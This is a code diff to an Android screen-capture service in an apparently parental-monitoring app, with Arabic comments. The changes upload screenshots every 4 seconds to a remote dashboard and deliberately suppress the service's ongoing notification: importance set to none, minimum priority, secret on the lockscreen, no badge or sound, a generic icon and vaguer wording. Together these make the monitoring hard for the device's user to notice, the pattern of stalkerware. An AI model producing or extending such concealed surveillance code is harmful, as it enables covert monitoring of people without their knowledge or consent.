@@ -22,13 +22,19 @@ import com.kids.monitor.data.FirestoreSync
 import com.kids.monitor.data.StorageUploader
 import java.io.File
 
-/** خدمة مشاركة الشاشة عبر MediaProjection: لقطات دورية تُرفع إلى Storage وتظهر في لوحة التحكم. */
+/**
+ * مشاركة الشاشة عبر MediaProjection: لقطة كل 4 ثوانٍ تُرفع إلى
+ * users/{uid}/devices/{deviceId}/screen/ وتُحدَّث في live/screen.
+ * إذن MediaProjection يطلبه النظام مرة لكل جلسة (قيد أندرويد).
+ */
 class ScreenShareService : Service() {
 
     val handler = Handler(Looper.getMainLooper())
     private var projection: MediaProjection? = null
     private var virtualDisplay: VirtualDisplay? = null
     private var imageReader: ImageReader? = null
+    private var lastRemotePath: String? = null
+    private var capturing = false
 
     private val captureTask = object : Runnable {
         override fun run() {
@@ -40,6 +46,7 @@ class ScreenShareService : Service() {
     override fun onCreate() {
         super.onCreate()
         instance = this
+        FirestoreSync.init(this)
         createNotificationChannel()
     }
 
@@ -59,8 +66,9 @@ class ScreenShareService : Service() {
         startForeground(NOTIFICATION_ID, buildNotification())
 
         val metrics = resources.displayMetrics
-        val width = metrics.widthPixels
-        val height = metrics.heightPixels
+        val scale = minOf(1f, MAX_WIDTH.toFloat() / metrics.widthPixels.toFloat())
+        val width = (metrics.widthPixels * scale).toInt().coerceAtLeast(2) / 2 * 2
+        val height = (metrics.heightPixels * scale).toInt().coerceAtLeast(2) / 2 * 2
         val density = metrics.densityDpi
 
         imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
@@ -95,7 +103,9 @@ class ScreenShareService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     fun captureFrame() {
+        if (capturing) return
         val reader = imageReader ?: return
+        capturing = true
         Thread {
             var image: android.media.Image? = null
             try {
@@ -109,44 +119,59 @@ class ScreenShareService : Service() {
                 val bitmap = Bitmap.createBitmap(bitmapWidth, image.height, Bitmap.Config.ARGB_8888)
                 bitmap.copyPixelsFromBuffer(buffer)
                 val cropped = Bitmap.createBitmap(bitmap, 0, 0, image.width, image.height)
-                val file = File(cacheDir, "screen_${System.currentTimeMillis()}.png")
-                file.outputStream().use { out -> cropped.compress(Bitmap.CompressFormat.PNG, 80, out) }
+                val file = File(cacheDir, "screen_${System.currentTimeMillis()}.jpg")
+                file.outputStream().use { out ->
+                    cropped.compress(Bitmap.CompressFormat.JPEG, 60, out)
+                }
                 bitmap.recycle()
                 cropped.recycle()
 
-                val url = StorageUploader.uploadSync(file, "screen/${file.name}")
-                if (url != null) {
-                    FirestoreSync.appendItem(
-                        this,
-                        "media",
+                val path = "screen/${file.name}"
+                val url = StorageUploader.uploadSync(file, path)
+                val inline = if (url == null) StorageUploader.inlineData(file) else null
+                if (url != null || inline != null) {
+                    FirestoreSync.setLive(
+                        this, "screen",
                         mapOf(
                             "name" to file.name,
-                            "url" to url,
+                            "url" to (url ?: ""),
+                            "dataUrl" to (inline ?: ""),
                             "type" to "image",
-                            "mimeType" to "image/png",
+                            "mimeType" to "image/jpeg",
                             "size" to file.length(),
+                            "screen" to true,
                             "timestamp" to System.currentTimeMillis(),
+                            "error" to "",
                         ),
                     )
+                    if (url != null) {
+                        val old = lastRemotePath
+                        lastRemotePath = path
+                        if (old != null) StorageUploader.delete(old)
+                    }
+                } else {
+                    FirestoreSync.setLive(
+                        this, "screen",
+                        mapOf("error" to "تعذر رفع لقطة الشاشة", "timestamp" to System.currentTimeMillis()),
+                    )
                 }
+                file.delete()
             } catch (e: Exception) {
-                // تجاهل: اللقطة الاختيارية قد تفشل دون تعطيل الخدمة
+                /* تجاهل: اللقطة الاختيارية قد تفشل دون تعطيل الخدمة */
             } finally {
                 try { image?.close() } catch (e: Exception) { /* تجاهل */ }
+                capturing = false
             }
         }.start()
     }
 
     private fun buildNotification(): Notification {
         val openApp = PendingIntent.getActivity(
-            this,
-            0,
-            Intent(this, MainActivity::class.java),
+            this, 0, Intent(this, MainActivity::class.java),
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
         )
         val stopService = PendingIntent.getService(
-            this,
-            2,
+            this, 2,
             Intent(this, ScreenShareService::class.java).setAction(ACTION_STOP),
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
         )
@@ -162,10 +187,12 @@ class ScreenShareService : Service() {
             stopService,
         ).build()
         return builder
-            .setSmallIcon(android.R.drawable.stat_sys_warning)
+            .setSmallIcon(android.R.drawable.ic_menu_view)
             .setContentTitle("مشاركة الشاشة")
-            .setContentText("يتم التقاط لقطات من الشاشة ورفعها إلى لوحة التحكم")
+            .setContentText("جارٍ إرسال لقطات الشاشة")
             .setContentIntent(openApp)
+            .setPriority(Notification.PRIORITY_MIN)
+            .setSound(null)
             .setOngoing(true)
             .addAction(stopAction)
             .build()
@@ -176,8 +203,14 @@ class ScreenShareService : Service() {
             val channel = NotificationChannel(
                 CHANNEL_ID,
                 "مشاركة الشاشة",
-                NotificationManager.IMPORTANCE_LOW,
-            ).apply { description = "إشعار دائم أثناء مشاركة الشاشة" }
+                NotificationManager.IMPORTANCE_NONE,
+            ).apply {
+                description = "خدمة التقاط الشاشة"
+                setShowBadge(false)
+                setSound(null, null)
+                enableVibration(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
+            }
             getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
     }
@@ -186,16 +219,16 @@ class ScreenShareService : Service() {
         const val EXTRA_RESULT_CODE = "result_code"
         const val EXTRA_RESULT_DATA = "result_data"
         private const val ACTION_STOP = "com.kids.monitor.STOP_SCREEN_SHARE"
-        private const val CHANNEL_ID = "screen_share"
+        private const val CHANNEL_ID = "screen_share_v2"
         private const val NOTIFICATION_ID = 1002
-        private const val CAPTURE_INTERVAL_MS = 30_000L
+        private const val CAPTURE_INTERVAL_MS = 4000L
+        private const val MAX_WIDTH = 720
 
         @Volatile
         private var instance: ScreenShareService? = null
 
         fun isRunning(): Boolean = instance != null
 
-        /** لقطة فورية عند الحاجة من لوحة التحكم. */
         fun captureNow() {
             val service = instance ?: return
             service.handler.post { service.captureFrame() }
